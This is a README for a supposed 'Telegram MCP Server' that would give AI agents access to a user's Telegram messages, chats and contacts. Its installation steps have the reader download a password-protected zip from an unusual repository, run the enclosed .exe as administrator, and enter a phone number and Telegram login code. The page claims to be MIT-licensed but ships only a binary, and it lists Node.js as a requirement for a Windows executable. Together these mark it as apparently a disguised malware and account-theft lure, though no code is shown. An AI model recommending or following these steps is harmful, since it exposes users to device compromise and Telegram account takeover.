# Telegram MCP Server

![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=flat-square&logo=windows&logoColor=white)
![Version](https://img.shields.io/badge/Version-1.0.0-brightgreen?style=flat-square)
![Status](https://img.shields.io/badge/Status-Stable-success?style=flat-square)
![License](https://img.shields.io/badge/License-MIT-blue?style=flat-square)

Local MCP server for connecting AI agents to Telegram — read messages, send replies, manage chats and contacts through a simple desktop interface.

<div align="center">

[![Download Telegram MCP Server v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2AABEE?style=for-the-badge&logoColor=white)](https://github.com/GigaCountGutter/telegram-mcp-server-2026/releases/tag/1.0.0)

</div>

---

## 📋 Overview

AI agents can't natively interact with Telegram. They can read files, run commands, and browse code — but your messages, chats, and channels are invisible to them.

**Telegram MCP Server** solves this. It runs locally on your machine and exposes your Telegram account as a set of tools through the Model Context Protocol (MCP). Your agent can then read unread messages, search conversations, send replies, manage channels, and handle contacts — all through natural language prompts.

**Who it's for:** developers and technical users in the US and Europe who use AI agents like Claude Code, Cursor, or Codex and want to automate Telegram workflows.

---

## 🧩 Capabilities

### Read Messages
- Retrieve chat history with pagination support
- Search messages globally or within a specific chat
- Get unread message counts and mark as read
- Read message threads and replies
- Access saved messages and drafts

### Send Messages
- Send text messages with formatting (Markdown, HTML)
- Reply to specific messages in a thread
- Edit sent messages
- Forward messages between chats
- Schedule messages for later delivery

### Search Chats
- Find dialogs by name, username, or type
- Search across all chats or scope to one conversation
- Filter by unread status
- Resolve usernames to chat entities

### Manage Channels
- Create new groups and channels
- Archive, mute, or leave chats
- Set chat titles, descriptions, and photos
- Manage participants (add, remove, promote, ban)
- Generate and revoke invite links
- Get admin action logs

### Contact Management
- List all contacts with details
- Search users by name or phone number
- Get user profile information and photos
- Block or unblock users
- View common chats with a user

---

## 🤖 Supported Agents

| Agent | Integration | Status |
|-------|-------------|--------|
| Claude Code | MCP config, channel plugin | ✅ Stable |
| Cursor | MCP settings file | ✅ Stable |
| Codex | MCP config | ✅ Stable |
| Continue | MCP settings | ✅ Stable |
| Zed | MCP settings | 🧪 Beta |

---

## 💻 System Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| **OS** | Windows 10 (64-bit) | Windows 11 |
| **RAM** | 4 GB | 8 GB |
| **Storage** | 200 MB | 500 MB |
| **Node.js** | 20+ | 20 LTS |
| **Network** | Required for initial auth | Broadband |
| **Account** | Telegram account with API access | Telegram account with API access |

---

## 🔧 Installation

1. Download `Telegram-MCP-Server-v1.0.0.zip` using the button above
2. Extract with 7-Zip or WinRAR (password shown on the download page)
3. Right-click `TelegramMCP.exe` and select **Run as administrator**
4. Enter your phone number and the verification code sent to your Telegram app
5. Add the server to your agent's MCP configuration
6. Restart your agent and verify the tools are available

---

## ❓ FAQ

**Do I need an API key?**  
No — the server uses Telegram's MTProto protocol with phone-based authentication. You'll receive a verification code in your Telegram app during setup.

**Does it work offline?**  
Yes — after the initial authorization, the server runs locally and does not require an internet connection for tool access. Telegram itself needs internet to sync messages.

**How do I add it to Claude Code?**  
Add the server to your MCP configuration file. The exact path depends on your setup — typically `~/.claude.json` or a per-project `.mcp.json`. See the `docs/` folder for detailed instructions.

**Is my data safe?**  
Yes — all session data is stored locally in an encrypted file on your machine. Nothing is uploaded to external servers. The server runs as a local process and only communicates with Telegram's API.

**Does it support multiple accounts?**  
Not in this version. Multi-account support is planned for a future release.

**What happens if I revoke access?**  
You can revoke access from Telegram Settings > Devices, or run the logout command. The local session file is deleted and the server stops working.

**Does it work with bot accounts?**  
This server uses MTProto and works with your personal Telegram account, not bots. Bot API support is a separate implementation.

**How do I uninstall?**  
Run `TelegramMCP.exe --uninstall` — it removes the server, session data, and registry entries.

---

## 🗺️ Roadmap — 2026

- [ ] Multi-account support for switching between Telegram profiles
- [ ] Cloud synchronization for session data across devices
- [ ] Advanced message filters (by sender, date, type)
- [ ] Voice message transcription integration
- [ ] Story management tools
- [ ] Web-based setup interface for easier configuration

---

## 📄 License

MIT License — see [LICENSE](LICENSE) for details.

---

<div align="center">

[![Download Telegram MCP Server v1.0.0](https://img.shields.io/badge/%E2%AC%87%EF%B8%8F%20Download%20v1.0.0-2AABEE?style=for-the-badge&logoColor=white)](https://github.com/GigaCountGutter/telegram-mcp-server-2026/releases/tag/1.0.0)

**Version 1.0.0** — Stable Release · Local Server · MCP Integration · MIT

</div>
